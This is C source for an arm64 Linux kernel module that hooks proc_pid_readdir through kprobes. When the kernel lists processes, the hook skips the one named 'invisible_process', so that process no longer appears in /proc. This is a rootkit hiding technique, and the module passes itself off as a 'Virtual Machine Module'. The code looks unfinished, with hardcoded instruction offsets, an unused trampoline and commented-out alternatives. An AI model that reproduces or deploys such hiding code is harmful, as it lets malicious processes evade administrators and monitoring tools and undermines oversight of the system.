#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/errno.h>

#define PROCESS_NAME "invisible_process"

#define __pr_info(fmt, ...) printk(KERN_INFO "[%s:%d] %s(): " fmt "\n", \
                                   __FILE__, __LINE__, __func__, ##__VA_ARGS__)

#define __pr_debug(fmt, ...) printk(KERN_DEBUG "[%s:%d] %s(): " fmt "\n", \
    __FILE__, __LINE__, __func__ , ##__VA_ARGS__)


pid_t find_pid_by_name(const char *process_name) {
    struct task_struct *task = NULL;

    for_each_process(task) {
        if (strcmp(task->comm, process_name) == 0) {
            return task->pid;
        }
    }

    return -1;
}

    int my_proc_pid_readdir(struct file *file, struct dir_context *ctx)
    {
        __pr_info("my_proc_pid_readdir");
        return 0;
    }

static void __naked hook_trampoline(void)
{
    asm volatile(
        /* Create a minimal frame (push x29, x30) */
        "stp    x29, x30, [sp, #-16]!\n"
        "mov    x29, sp\n"

        /* Call the C helper. x0..x7 at this point contain the original regs. */
        "bl     my_proc_pid_readdir\n"

        /* Restore frame */
        "mov    sp, x29\n" /* unwind to frame pointer */
        "ldp    x29, x30, [sp], #16\n"

        /* Branch to continuation address stored in x19 */
        "br     x19\n" ::: "memory");
}

    struct tgid_iter {
        unsigned int tgid;
        struct task_struct *task;
    };

static int proc_pid_readdir_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    pid_t proc_pid = regs->regs[3];
    pid_t target_pid = find_pid_by_name(PROCESS_NAME);
    __pr_info("proc_pid: %d, target_pid: %d", proc_pid, target_pid);
    if (proc_pid == target_pid) {
        __pr_info("Hiding %s: %d", PROCESS_NAME, proc_pid);
        
        regs->pc = (unsigned long)p->addr + 0xDC;
        /*regs->pc = (unsigned long)0xffff8000805b0144;*/
        return 1;
    }
    return 0;
    // regs->regs[19] = (unsigned long)p->addr + 4;
    // regs->pc = (unsigned long)hook_trampoline;
    // return 1;
}


static int sys_kill_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    __pr_info("sys_kill_pre_handler");
    return 0;
}

static struct kprobe kp1 = { .symbol_name = "proc_pid_readdir",
    .offset = 0x134,
    .pre_handler = proc_pid_readdir_pre_handler };

static struct kprobe kp2 = { .symbol_name = "sys_kill",
    .offset = 0x00,
    .pre_handler = sys_kill_pre_handler };

static struct kprobe* kprobe_handlers[] = {
    &kp1, 
};

static int __init vm_init(void)
{
    int ret;
    ret = register_kprobes(kprobe_handlers, ARRAY_SIZE(kprobe_handlers));
    if (ret < 0) {
        __pr_info("Failed to register kprobes %d", ret);
        return ret;
    }

    return 0;
}

static void __exit vm_exit(void)
{
    unregister_kprobes(kprobe_handlers, ARRAY_SIZE(kprobe_handlers));
}

module_init(vm_init);
module_exit(vm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("EmbeddedOS");
MODULE_DESCRIPTION("Virtual Machine Module");
